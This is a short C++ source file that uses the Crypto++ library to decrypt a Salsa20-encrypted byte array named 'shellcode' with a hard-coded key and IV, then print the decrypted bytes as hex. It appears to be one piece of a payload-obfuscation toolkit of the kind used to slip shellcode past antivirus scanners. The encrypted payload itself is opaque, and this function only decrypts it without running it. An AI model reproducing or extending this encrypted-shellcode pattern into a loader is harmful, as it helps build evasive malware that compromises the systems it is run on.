#include "cryptlib.h"
#include "secblock.h"
#include "salsa.h"
#include "osrng.h"
#include "files.h"
#include "hex.h"
#include <random>
#include <iostream>
#include <string>


using namespace std;


int decryptor() {

	unsigned char shellcode[] = { 0x57,0x14,0x7b,0xa0,0xe5,0xe3,0x22,0x98,0x7d,0xf0,0xc8,0x6,0x1e,0xf8,0xcb,0x7,0x68,0xf7,0xf2,0x18,0x92,0xb8,0x5d,0xbf,0x50,0x33,0x15,0xd,0x4a,0x2e,0x2c,0xd6,0xbd,0xdf,0xaf,0x32,0xb0,0x80,0x34,0x68,0xaf,0x4b,0x66,0xa1,0x30,0xa2,0x1b,0x9b,0xfd,0x69,0x75,0xaa,0x1f,0x5c,0x71,0x26,0x6d,0xec,0x76,0x59,0xea,0x8f,0xb7,0xa3,0x58,0x7a,0x79,0x6e,0xd,0xf0,0x49,0xbe,0xa2,0x59,0xa0,0xe3,0xb7,0xa3,0xb4,0x31,0xb2,0xd8,0x6a,0x8f,0x28,0xc8,0x3b,0x2d,0x13,0x6c,0x68,0xeb,0x2b,0xc9,0x18,0x6,0xca,0xe2,0x78,0x5c,0x84,0x52,0x84,0x9a,0x5d,0xd8,0x34,0x79,0xfc,0x9f,0xec,0xd7,0xbe,0x54,0xc0,0x93,0x97,0xa8,0x25,0x26,0xa0,0x37,0xdf,0x8d,0x67,0x4f,0x3d,0x1f,0x7f,0xb,0xc8,0xae,0x38,0x75,0xdd,0x7b,0x27,0x88,0x3,0x43,0xbd,0x2,0x59,0x25,0xd8,0xed,0xd0,0x46,0xea,0x8d,0x3c,0xc4,0x6b,0x1b,0xc2,0xaf,0xc,0x5f,0x40,0x2d,0xf,0x58,0x11,0x8e,0xc3,0x3c,0xd0,0x25,0x40,0x21,0xce,0xb,0x7a,0x30,0x7e,0xf3,0x4,0xdb,0x4d,0xcd,0xbf,0xb8,0xd,0xa0,0x47,0x29,0xa9,0x92,0x1c,0xa1,0x8d,0x73,0xcc,0x46,0x8f,0x29,0x93,0x33,0x82,0x85,0x39,0xd,0x57,0xc2,0x40,0xef,0x27,0x4e,0xa4,0x13,0x72,0xb,0x90,0x13,0x3e,0xa2,0x5d,0xbd,0x20,0x6c,0x34,0xf9,0x83,0xbc,0x9,0x5e,0x6e,0x67,0x5c,0x4d,0x70,0xe7,0xd3,0x71,0x28,0xed,0xc4,0x8,0x97,0x1e,0x2,0xc6,0x9a,0xb7,0xbf,0x3e,0x53,0x4d,0x56,0x26,0x60,0xba,0xff,0x98,0xa9,0xb0,0x70,0x19,0xd5,0x7a,0xc,0x53,0x4f,0xb1,0x10,0x23,0xa9,0x55,0x2d,0x25,0x80,0xc1,0xf1,0x2e,0x7f,0x8f,0xed,0xe8,0x10,0xd3,0x46,0x81,0xeb,0x4a,0xb8,0x4d,0x7,0x66 };
	unsigned char key[] = { 0xaf,0xaf,0x19,0x4d,0xd1,0x71,0x62,0x15,0xa,0x7,0x56,0xd1,0xa1,0x4a,0x4e,0x42 };
	unsigned char iv[] = { 0x91,0x7c,0xf7,0x90,0xce,0x6a,0xca,0xc1 };

	CryptoPP::Salsa20::Decryption Dec;

	Dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));

	Dec.ProcessData(shellcode, shellcode, sizeof(shellcode));

	for (size_t i = 0; i < sizeof(shellcode); i++)
	{
		cout << "0x" << hex << (int)shellcode[i] << ",";
	}

	return 0;
}